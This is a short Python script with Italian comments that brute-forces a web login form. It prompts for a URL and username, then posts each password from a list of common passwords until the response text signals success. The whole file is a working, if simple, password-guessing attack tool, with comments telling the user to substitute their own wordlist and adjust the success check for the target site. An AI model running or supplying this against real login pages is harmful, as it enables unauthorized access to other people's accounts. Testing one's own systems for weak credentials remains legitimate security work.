import requests

# Funzione per brute-force su un form di login
def brute_force_login():
    url = input("Inserisci URL del form di login (es. http://example.com/login): ")
    username = input("Inserisci username di test: ")
    wordlist = ["123456", "password", "qwerty", "letmein", "admin"]  # Sostituisci con la tua lista

    for password in wordlist:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "login success" in response.text.lower():  # Modifica questa condizione in base al sito
            print(f"Login riuscito con la password: {password}")
            break
        else:
            print(f"Password tentata: {password} - Non corretta")
